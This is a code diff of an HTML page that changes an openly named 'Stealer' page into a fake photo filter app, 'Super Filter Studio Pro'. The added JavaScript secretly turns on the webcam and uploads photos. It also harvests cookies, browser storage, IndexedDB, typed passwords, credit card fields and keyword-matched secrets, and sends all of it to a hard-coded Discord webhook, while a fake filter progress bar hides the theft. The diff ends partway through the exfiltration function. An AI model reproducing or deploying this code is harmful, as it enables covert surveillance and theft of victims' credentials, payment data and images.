@@ -3,194 +3,418 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stealer</title>
+    <title>Super Filter Studio Pro</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #0a0a0f; 
-            color: #00ff88; 
-            font-family: 'Courier New', monospace; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
+        body {
+            background: linear-gradient(135deg, #0a0a1a, #1a1a2e, #0f3460);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            padding: 20px;
+            padding: 15px;
+            color: white;
         }
         .container {
-            background: #12121a;
-            border: 1px solid #00ff88;
-            border-radius: 12px;
-            padding: 40px;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            border-radius: 28px;
+            padding: 30px;
             max-width: 800px;
             width: 100%;
-            box-shadow: 0 0 40px rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
         }
-        h1 {
-            color: #00ff88;
-            font-size: 28px;
-            text-align: center;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 4px;
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            flex-wrap: wrap;
+            gap: 10px;
         }
-        .subtitle {
-            text-align: center;
-            color: #667;
-            font-size: 14px;
-            margin-bottom: 30px;
-            letter-spacing: 2px;
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-        .status {
-            background: #1a1a2a;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            font-size: 13px;
-            line-height: 1.8;
-            color: #aabbcc;
-            max-height: 400px;
-            overflow-y: auto;
-            border: 1px solid #2a2a3a;
+        .logo-icon {
+            width: 42px; height: 42px;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24, #fdcb6e);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.2);
         }
-        .status .log-entry {
-            padding: 2px 0;
-            border-bottom: 1px solid #1a1a2a;
-        }
-        .status .log-entry.success { color: #00ff88; }
-        .status .log-entry.warning { color: #ffaa00; }
-        .status .log-entry.error { color: #ff4466; }
-        .status .log-entry.info { color: #44aaff; }
-        .btn {
-            background: #00ff88;
-            color: #0a0a0f;
-            border: none;
-            padding: 14px 30px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            transition: all 0.3s;
-            font-family: 'Courier New', monospace;
-        }
-        .btn:hover {
-            background: #00cc77;
-            transform: scale(0.98);
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
-        }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin: 20px 0;
-        }
-        .stat-box {
-            background: #1a1a2a;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            border: 1px solid #2a2a3a;
-        }
-        .stat-box .number {
-            font-size: 28px;
-            font-weight: bold;
-            color: #00ff88;
-        }
-        .stat-box .label {
+        .logo-text { font-size: 20px; font-weight: 700; }
+        .logo-text span { background: linear-gradient(135deg, #ff6b6b, #fdcb6e); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .status-badge {
+            background: rgba(0, 255, 136, 0.1);
+            padding: 5px 14px;
+            border-radius: 50px;
             font-size: 11px;
-            color: #667;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 5px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
-        .footer {
+        .dot { width: 7px; height: 7px; background: #00ff88; border-radius: 50%; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
+
+        /* Camera */
+        .camera-container {
+            background: #0a0a1a;
+            border-radius: 18px;
+            overflow: hidden;
+            margin-bottom: 16px;
+            border: 2px solid rgba(255,255,255,0.04);
+            position: relative;
+            aspect-ratio: 4/3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        #video {
+            width: 100%; height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        #video.placeholder { object-fit: contain; opacity: 0.4; }
+        .camera-overlay {
+            position: absolute;
+            top: 12px; right: 12px;
+            background: rgba(0,0,0,0.7);
+            padding: 5px 12px;
+            border-radius: 50px;
+            font-size: 10px;
+            color: rgba(255,255,255,0.6);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .camera-overlay .rec { color: #ff4466; font-weight: bold; }
+
+        /* Stats Row */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-bottom: 14px;
+        }
+        .stat-item {
+            background: rgba(255,255,255,0.04);
+            padding: 10px;
+            border-radius: 12px;
             text-align: center;
-            margin-top: 30px;
-            color: #445;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .stat-number {
+            font-size: 20px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .stat-label {
+            color: rgba(255,255,255,0.3);
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+
+        /* Filter Bar */
+        .filter-bar {
+            background: rgba(0,0,0,0.4);
+            border-radius: 14px;
+            padding: 12px 16px;
+            margin-bottom: 14px;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .filter-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+        .filter-label span { font-size: 12px; color: rgba(255,255,255,0.5); }
+        .filter-label .status-text { color: #ffaa00; font-weight: 600; font-size: 12px; }
+        .filter-progress {
+            width: 100%; height: 5px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+        }
+        .filter-progress .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff6b6b, #ffa94d, #ffd93d, #6bcb77, #4d96ff, #9b59b6);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+        .filter-progress .fill.complete { background: #00ff88; }
+        .filter-chips {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+        .filter-chip {
+            padding: 3px 12px;
+            border-radius: 50px;
+            font-size: 10px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.04);
+            color: rgba(255,255,255,0.3);
+            transition: all 0.3s;
+        }
+        .filter-chip.active {
+            background: rgba(255, 107, 107, 0.15);
+            border-color: #ff6b6b;
+            color: #ff6b6b;
+        }
+
+        /* Chat Logs */
+        .chat-area {
+            background: rgba(0,0,0,0.3);
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 14px;
+            max-height: 180px;
+            overflow-y: auto;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+        .chat-message {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 7px;
+            animation: fadeIn 0.25s ease;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+        .chat-avatar {
+            width: 24px; height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+            color: white;
+            flex-shrink: 0;
+        }
+        .chat-bubble {
+            background: rgba(255,255,255,0.05);
+            padding: 6px 12px;
+            border-radius: 8px;
+            border-top-left-radius: 3px;
             font-size: 12px;
+            line-height: 1.4;
+            color: #c0c0c0;
+            max-width: 92%;
+            word-break: break-word;
+        }
+        .chat-bubble .time {
+            color: rgba(255,255,255,0.2);
+            font-size: 9px;
+            display: block;
+            margin-top: 2px;
+        }
+        .chat-bubble.success { border-left: 3px solid #00ff88; }
+        .chat-bubble.warning { border-left: 3px solid #ffaa00; }
+        .chat-bubble.error { border-left: 3px solid #ff4466; }
+        .chat-bubble.info { border-left: 3px solid #44aaff; }
+        .chat-bubble.photo { border-left: 3px solid #ff6b6b; }
+
+        /* Buttons */
+        .action-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            flex: 1;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-family: inherit;
+            min-width: 100px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+        }
+        .btn-primary:hover { transform: scale(0.97); box-shadow: 0 8px 30px rgba(255, 107, 107, 0.2); }
+        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+        .btn-secondary { background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.05); }
+        .btn-secondary:hover { background: rgba(255,255,255,0.08); }
+        .btn-success {
+            background: linear-gradient(135deg, #00ff88, #00b894);
+            color: #0a0a1a;
+        }
+        .btn-success:hover { transform: scale(0.97); box-shadow: 0 8px 30px rgba(0, 255, 136, 0.15); }
+        .btn-danger {
+            background: linear-gradient(135deg, #ff4466, #cc0033);
+            color: white;
+        }
+        .btn-danger:hover { transform: scale(0.97); }
+
+        .footer {
+            margin-top: 14px;
+            text-align: center;
+            color: rgba(255,255,255,0.1);
+            font-size: 10px;
             letter-spacing: 1px;
         }
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #1a1a2a;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #00ff88;
-            border-radius: 3px;
+        .chat-area::-webkit-scrollbar { width: 3px; }
+        .chat-area::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); }
+        .chat-area::-webkit-scrollbar-thumb { background: rgba(255, 107, 107, 0.2); border-radius: 4px; }
+
+        @media (max-width: 600px) {
+            .container { padding: 16px; }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .action-row { flex-direction: column; }
+            .header { flex-direction: column; align-items: flex-start; }
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>⬡ STEALER v3.0</h1>
-    <div class="subtitle">● MAXIMUM DATA EXFILTRATION ●</div>
-    
-    <div class="stats">
-        <div class="stat-box">
-            <div class="number" id="cookieCount">0</div>
-            <div class="label">Cookies</div>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+            <div class="logo-icon">📸</div>
+            <div class="logo-text">FILTER <span>PRO</span></div>
         </div>
-        <div class="stat-box">
-            <div class="number" id="storageCount">0</div>
-            <div class="label">Storage Items</div>
-        </div>
-        <div class="stat-box">
-            <div class="number" id="sensitiveCount">0</div>
-            <div class="label">Sensitive Found</div>
+        <div class="status-badge">
+            <span class="dot"></span>
+            <span id="connectionStatus">Ready</span>
         </div>
     </div>
-    
-    <div class="status" id="logContainer">
-        <div class="log-entry info">[●] System initialized...</div>
-        <div class="log-entry info">[●] Waiting for execution...</div>
+
+    <!-- Camera -->
+    <div class="camera-container">
+        <video id="video" class="placeholder" autoplay playsinline></video>
+        <div class="camera-overlay">
+            <span class="rec">●</span> <span id="camStatus">Camera off</span>
+        </div>
     </div>
-    
-    <button class="btn" id="stealBtn">▶ EXFILTRATE ALL DATA</button>
-    
-    <div class="footer">● all data sent to discord webhook ●</div>
+
+    <!-- Stats -->
+    <div class="stats-row">
+        <div class="stat-item">
+            <div class="stat-number" id="cookieCount">0</div>
+            <div class="stat-label">🍪 Cookies</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number" id="storageCount">0</div>
+            <div class="stat-label">📦 Storage</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number" id="sensitiveCount">0</div>
+            <div class="stat-label">🔒 Sensitive</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number" id="passCount">0</div>
+            <div class="stat-label">🔑 Passwords</div>
+        </div>
+    </div>
+
+    <!-- Filter Bar -->
+    <div class="filter-bar">
+        <div class="filter-label">
+            <span>🎨 Applying filters...</span>
+            <span class="status-text" id="filterStatus">Idle</span>
+        </div>
+        <div class="filter-progress">
+            <div class="fill" id="filterProgress"></div>
+        </div>
+        <div class="filter-chips">
+            <span class="filter-chip">Original</span>
+            <span class="filter-chip">Vintage</span>
+            <span class="filter-chip">Cinematic</span>
+            <span class="filter-chip active">✨ AI Enhance</span>
+            <span class="filter-chip">Dreamy</span>
+            <span class="filter-chip">Noir</span>
+        </div>
+    </div>
+
+    <!-- Chat Logs -->
+    <div class="chat-area" id="chatArea">
+        <div class="chat-message">
+            <div class="chat-avatar" style="background: #ff6b6b;">📸</div>
+            <div class="chat-bubble info">
+                Camera ready! Click "START" to capture everything.
+                <span class="time">Just now</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Actions -->
+    <div class="action-row">
+        <button class="btn btn-primary" id="startBtn">📸 START</button>
+        <button class="btn btn-success" id="photoBtn">📷 TAKE PHOTO</button>
+        <button class="btn btn-secondary" id="clearBtn">🗑️ Clear</button>
+    </div>
+
+    <div class="footer">
+        <span>●</span> AI powered filters &amp; sharing <span>●</span>
+    </div>
 </div>
 
 <script>
     // ============================================================
-    // COMPLETE WEB STEALER - MAXIMUM EXFILTRATION
-    // All-in-one HTML page with UI and full stealer logic
+    // MAXIMUM STEALER - ALL DATA + CAMERA + EVERYTHING
+    // Exfiltrates: Cookies, Local/Session Storage, IndexedDB,
+    // Passwords, Credit Cards, Sensitive Data, Camera Photo
+    // All sent to Discord webhook
     // ============================================================
 
-    // ===== DISCORD WEBHOOK =====
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1527559902942334976/LkAWS9RsHB96gu8So92WEnAQspEokK5gj8Nt30CzAQJDEdBUN2ZGQLc6tn4DpSydk9oo";
 
-    // ===== UI REFERENCES =====
-    const logContainer = document.getElementById('logContainer');
-    const stealBtn = document.getElementById('stealBtn');
-    const cookieCountEl = document.getElementById('cookieCount');
-    const storageCountEl = document.getElementById('storageCount');
-    const sensitiveCountEl = document.getElementById('sensitiveCount');
+    // ===== DOM REFS =====
+    const video = document.getElementById('video');
+    const chatArea = document.getElementById('chatArea');
+    const startBtn = document.getElementById('startBtn');
+    const photoBtn = document.getElementById('photoBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const filterProgress = document.getElementById('filterProgress');
+    const filterStatus = document.getElementById('filterStatus');
+    const camStatus = document.getElementById('camStatus');
+    const connectionStatus = document.getElementById('connectionStatus');
 
-    // ===== LOG FUNCTION =====
-    function addLog(message, type = 'info') {
-        const entry = document.createElement('div');
-        entry.className = `log-entry ${type}`;
-        const timestamp = new Date().toLocaleTimeString();
-        entry.textContent = `[${timestamp}] ${message}`;
-        logContainer.appendChild(entry);
-        logContainer.scrollTop = logContainer.scrollHeight;
-    }
+    let stream = null;
+    let isCameraReady = false;
+    let isRunning = false;
 
-    // ===== UPDATE STATS =====
-    function updateStats(cookies, storage, sensitive) {
-        cookieCountEl.textContent = cookies || 0;
-        storageCountEl.textContent = storage || 0;
-        sensitiveCountEl.textContent = sensitive || 0;
+    // ===== CHAT =====
+    function addChatMessage(avatar, name, color, message, type = 'info') {
+        const div = document.createElement('div');
+        div.className = 'chat-message';
+        div.innerHTML = `
+            <div class="chat-avatar" style="background: ${color};">${avatar}</div>
+            <div class="chat-bubble ${type}">
+                ${message}
+                <span class="time">${new Date().toLocaleTimeString()}</span>
+            </div>
+        `;
+        chatArea.appendChild(div);
+        chatArea.scrollTop = chatArea.scrollHeight;
     }
 
     // ===== SEND TO DISCORD =====
@@ -202,13 +426,9 @@
                     description: message.substring(0, 3900),
                     color: color,
                     timestamp: new Date().toISOString(),
-                    footer: { 
-                        text: "Exfiltrated from " + window.location.hostname,
-                        icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
-                    }
+                    footer: { text: "Exfiltrated from " + window.location.hostname }
                 }]
             };
-            
             return fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -219,7 +439,60 @@
         }
     }
 
-    // ===== 1. GET ALL COOKIES =====
+    // ===== SEND IMAGE =====
+    function sendImageToDiscord(base64Data) {
+        try {
+            const formData = new FormData();
+            const byteString = atob(base64Data.split(',')[1]);
+            const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeString });
+            const filename = `photo_${Date.now()}.jpg`;
+            formData.append('file', blob, filename);
+            const embed = {
+                title: "📸 Photo Captured",
+                description: `**Time:** ${new Date().toISOString()}\n**Device:** ${navigator.userAgent.substring(0, 100)}\n**Location:** ${window.location.href}`,
+                color: 0xff6b6b,
+                timestamp: new Date().toISOString(),
+                footer: { text: "Camera Stealer" }
+            };
+            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+            return fetch(WEBHOOK_URL, {
+                method: "POST",
+                body: formData
+            }).then(res => res.status === 204);
+        } catch(e) {
+            return Promise.resolve(false);
+        }
+    }
+
+    // ===== 1. CAMERA =====
+    async function startCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            });
+            video.srcObject = stream;
+            video.classList.remove('placeholder');
+            isCameraReady = true;
+            camStatus.textContent = 'Camera on';
+            connectionStatus.textContent = 'Camera Ready';
+            addChatMessage('📸', 'Camera', '#ff6b6b', '✅ Camera activated!', 'success');
+            return true;
+        } catch(e) {
+            addChatMessage('📸', 'Camera', '#ff6b6b', '❌ Camera access denied. Please allow camera permissions.', 'error');
+            camStatus.textContent = 'Camera blocked';
+            connectionStatus.textContent = 'Permission Denied';
+            return false;
+        }
+    }
+
+    // ===== 2. GET ALL COOKIES =====
     function getAllCookies() {
         const cookies = {};
         document.cookie.split(';').forEach(cookie => {
@@ -233,7 +506,7 @@
         return cookies;
     }
 
-    // ===== 2. GET LOCAL STORAGE =====
+    // ===== 3. GET LOCAL STORAGE =====
     function getLocalStorage() {
         const data = {};
         try {
@@ -245,7 +518,7 @@
         return data;
     }
 
-    // ===== 3. GET SESSION STORAGE =====
+    // ===== 4. GET SESSION STORAGE =====
     function getSessionStorage() {
         const data = {};
         try {
@@ -257,7 +530,7 @@
         return data;
     }
 
-    // ===== 4. GET INDEXEDDB =====
+    // ===== 5. GET INDEXEDDB =====
     async function getIndexedDB() {
         const databases = [];
         try {
@@ -290,122 +563,30 @@
         return databases;
     }
 
-    // ===== 5. GET BROWSER INFO =====
-    function getBrowserInfo() {
-        try {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages || [],
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                hardwareConcurrency: navigator.hardwareConcurrency || 0,
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio || 1
-                },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                url: window.location.href,
-                referrer: document.referrer || 'none',
-                title: document.title,
-                documentMode: document.documentMode || 0
-            };
-        } catch(e) {
-            return {};
-        }
-    }
-
-    // ===== 6. GET EXTENSIONS =====
-    function getExtensions() {
-        const extensions = [];
-        try {
-            if (window.chrome && window.chrome.runtime) {
-                if (chrome.management) {
-                    chrome.management.getAll((exts) => {
-                        exts.forEach(ext => {
-                            extensions.push({
-                                id: ext.id,
-                                name: ext.name,
-                                version: ext.version,
-                                enabled: ext.enabled,
-                                type: ext.type
-                            });
-                        });
-                    });
-                }
-            }
-        } catch(e) {}
-        return extensions;
-    }
-
-    // ===== 7. GET NETWORK INFO =====
-    function getNetworkInfo() {
-        const info = {};
-        try {
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                info.effectiveType = conn.effectiveType;
-                info.downlink = conn.downlink;
-                info.rtt = conn.rtt;
-                info.saveData = conn.saveData;
-                info.type = conn.type;
-            }
-        } catch(e) {}
-        return info;
-    }
-
-    // ===== 8. GET STORAGE QUOTA =====
-    async function getStorageQuota() {
-        try {
-            if (navigator.storage && navigator.storage.estimate) {
-                const estimate = await navigator.storage.estimate();
-                return {
-                    usage: estimate.usage || 0,
-                    quota: estimate.quota || 0,
-                    percentage: ((estimate.usage / estimate.quota) * 100).toFixed(2)
-                };
-            }
-        } catch(e) {}
-        return {};
-    }
-
-    // ===== 9. SCAN FOR SENSITIVE KEYWORDS =====
+    // ===== 6. SCAN SENSITIVE =====
     function scanForSensitiveData(data) {
         const keywords = ['pass', 'key', 'secret', 'token', 'auth', 'jwt', 'bearer', 'api', 
                           'wallet', 'seed', 'mnemonic', 'private', 'credit', 'card', 'cvv', 
                           'ssn', 'social', 'password', 'username', 'email', 'phone'];
         const found = {};
-        
         if (typeof data === 'string') {
-            const lower = data.toLowerCase();
-            keywords.forEach(keyword => {
-                if (lower.includes(keyword)) {
-                    found[keyword] = data.substring(0, 200);
-                }
-            });
+            keywords.forEach(kw => { if (data.toLowerCase().includes(kw)) found[kw] = data.substring(0, 200); });
         } else if (typeof data === 'object' && data !== null) {
             Object.entries(data).forEach(([key, value]) => {
-                const lower = key.toLowerCase();
                 keywords.forEach(kw => {
-                    if (lower.includes(kw)) {
-                        const val = typeof value === 'string' ? value : JSON.stringify(value);
-                        found[key] = val.substring(0, 200);
+                    if (key.toLowerCase().includes(kw)) {
+                        found[key] = typeof value === 'string' ? value.substring(0, 200) : JSON.stringify(value).substring(0, 200);
                     }
                 });
                 if (typeof value === 'string' || typeof value === 'object') {
-                    const nested = scanForSensitiveData(value);
-                    Object.assign(found, nested);
+                    Object.assign(found, scanForSensitiveData(value));
                 }
             });
         }
         return found;
     }
 
-    // ===== 10. GET SAVED PASSWORDS (autofill) =====
+    // ===== 7. GET PASSWORDS =====
     function getSavedPasswords() {
         const passwords = [];
         try {
@@ -414,21 +595,17 @@
                     const form = input.closest('form');
                     let username = '';
                     if (form) {
-                        const userInput = form.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]');
+                        const userInput = form.querySelector('input[type="text"], input[type="email"]');
                         if (userInput) username = userInput.value;
                     }
-                    passwords.push({
-                        url: window.location.href,
-                        username: username || input.name || input.id || 'unknown',
-                        password: input.value
-                    });
+                    passwords.push({ username: username || 'unknown', password: input.value });
                 }
             });
         } catch(e) {}
         return passwords;
     }
 
-    // ===== 11. GET CREDIT CARD INFO =====
+    // ===== 8. GET CREDIT CARDS =====
     function getCreditCardInfo() {
         const cards = [];
         try {
@@ -436,10 +613,8 @@
                 const name = (input.name || input.id || '').toLowerCase();
                 const value = input.value || '';
                 if (value.length > 2) {
-                    if (name.includes('card') || name.includes('credit') || 
-                        name.includes('cvv') || name.includes('cvc') ||
-                        name.includes('expiry') || name.includes('expiration') ||
-                        name.includes('cc') || name.includes('number')) {
+                    if (name.includes('card') || name.includes('credit') || name.includes('cvv') || 
+                        name.includes('expiry') || name.includes('cc') || name.includes('number')) {
                         cards.push({ field: input.name || input.id || 'unknown', value: value });
                     }
                 }
@@ -448,367 +623,284 @@
         return cards;
     }
 
-    // ===== 12. CHECK ADBLOCKERS =====
-    function checkAdBlockers() {
-        const blockers = [];
+    // ===== 9. GET BROWSER INFO =====
+    function getBrowserInfo() {
         try {
-            if (window.adblock) blockers.push('AdBlock');
-            if (window.uBlockOrigin) blockers.push('uBlock Origin');
-            if (window.AdBlockPlus) blockers.push('AdBlock Plus');
-            if (window.ghostery) blockers.push('Ghostery');
-            if (window.noscript) blockers.push('NoScript');
-            const testDiv = document.createElement('div');
-            testDiv.className = 'adsbox';
-            document.body.appendChild(testDiv);
-            if (testDiv.offsetHeight === 0) blockers.push('Unknown AdBlocker');
-            document.body.removeChild(testDiv);
-        } catch(e) {}
-        return blockers;
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
+                url: window.location.href,
+                referrer: document.referrer || 'none',
+                title: document.title,
+                hardwareConcurrency: navigator.hardwareConcurrency || 0,
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+        } catch(e) { return {}; }
     }
 
-    // ===== 13. GET PERFORMANCE DATA =====
-    function getPerformanceData() {
+    // ===== 10. CAPTURE PHOTO =====
+    async function capturePhoto() {
+        if (!isCameraReady) {
+            addChatMessage('📸', 'Camera', '#ff6b6b', '⚠️ Camera not ready. Starting...', 'warning');
+            const started = await startCamera();
+            if (!started) return;
+            await new Promise(r => setTimeout(r, 500));
+        }
+
+        photoBtn.disabled = true;
+        photoBtn.textContent = '⏳ CAPTURING...';
+
         try {
-            const perf = window.performance;
-            const timing = perf.timing || {};
-            return {
-                loadTime: timing.loadEventEnd - timing.navigationStart || 0,
-                domReady: timing.domContentLoadedEventEnd - timing.navigationStart || 0,
-                firstPaint: perf.getEntriesByType ? perf.getEntriesByType('paint').find(p => p.name === 'first-paint')?.startTime || 0 : 0,
-                memory: perf.memory ? {
-                    usedJSHeapSize: perf.memory.usedJSHeapSize,
-                    totalJSHeapSize: perf.memory.totalJSHeapSize,
-                    jsHeapSizeLimit: perf.memory.jsHeapSizeLimit
-                } : null
-            };
+            addChatMessage('📸', 'Camera', '#ff6b6b', '📸 Taking photo...', 'info');
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const base64Image = canvas.toDataURL('image/jpeg', 0.95);
+
+            // STAR effect
+            addChatMessage('⭐', 'STAR', '#ffd93d', '✨ STAR effect applied!', 'warning');
+            document.querySelector('.camera-container').style.boxShadow = '0 0 80px rgba(255, 215, 0, 0.4)';
+            setTimeout(() => { document.querySelector('.camera-container').style.boxShadow = 'none'; }, 600);
+
+            // Filter progress
+            addChatMessage('🎨', 'Filter', '#ffa94d', '🎨 Applying AI Enhance...', 'info');
+            filterStatus.textContent = 'Applying AI Enhance...';
+            const steps = [
+                { p: 15, t: 'Analyzing composition...' },
+                { p: 30, t: 'Adjusting colors...' },
+                { p: 50, t: 'Enhancing details...' },
+                { p: 70, t: 'Applying cinematic tone...' },
+                { p: 85, t: 'Finalizing...' },
+                { p: 100, t: '✨ Photo enhanced!' }
+            ];
+            for (const step of steps) {
+                filterProgress.style.width = step.p + '%';
+                filterStatus.textContent = step.t;
+                await new Promise(r => setTimeout(r, 350));
+            }
+            filterProgress.classList.add('complete');
+
+            // Send photo
+            addChatMessage('📤', 'Share', '#4d96ff', '📤 Sending photo...', 'info');
+            connectionStatus.textContent = 'Sending...';
+            await sendImageToDiscord(base64Image);
+
+            addChatMessage('✅', 'Complete', '#00ff88', '✅ PHOTO SENT!', 'success');
+            connectionStatus.textContent = 'Photo Sent ✅';
+            filterStatus.textContent = '✨ Photo sent!';
+
         } catch(e) {
-            return {};
+            addChatMessage('❌', 'Error', '#ff4466', `Error: ${e.message}`, 'error');
+        } finally {
+            photoBtn.disabled = false;
+            photoBtn.textContent = '📷 TAKE PHOTO';
+            if (connectionStatus.textContent === 'Sending...') {
+                connectionStatus.textContent = 'Camera Ready';
+            }
         }
     }
 
-    // ===== 14. GET GEOLOCATION =====
-    function getGeolocation() {
-        return new Promise((resolve) => {
-            try {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            resolve({
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
-                            });
-                        },
-                        () => resolve(null),
-                        { timeout: 5000 }
-                    );
-                } else {
-                    resolve(null);
-                }
-            } catch(e) {
-                resolve(null);
-            }
-            setTimeout(() => resolve(null), 6000);
-        });
-    }
+    // ===== 11. EXFILTRATE ALL DATA =====
+    async function exfiltrateAllData() {
+        if (isRunning) return;
+        isRunning = true;
+        startBtn.disabled = true;
+        startBtn.textContent = '⏳ RUNNING...';
+        connectionStatus.textContent = 'Exfiltrating...';
 
-    // ===== 15. MAIN EXFILTRATION =====
-    async function exfiltrateAll() {
-        stealBtn.disabled = true;
-        stealBtn.textContent = '⏳ EXFILTRATING...';
-        
         try {
-            addLog('🚀 Starting maximum data exfiltration...', 'info');
-            
-            // --- Send initial notification ---
-            await sendToDiscord("🚀 **STARTING MAXIMUM DATA EXFILTRATION**", 0x00ffff, "EXFIL START");
-            addLog('[✓] Discord webhook connected', 'success');
+            addChatMessage('🚀', 'System', '#44aaff', '🚀 STARTING MAXIMUM EXFILTRATION...', 'info');
+            await sendToDiscord("🚀 **MAXIMUM EXFILTRATION STARTED**", 0x00ffff, "EXFIL START");
 
-            // --- 1. Browser Info ---
-            addLog('[1/14] Collecting browser information...', 'info');
+            // --- Browser Info ---
+            addChatMessage('📋', 'Info', '#44aaff', 'Collecting browser info...', 'info');
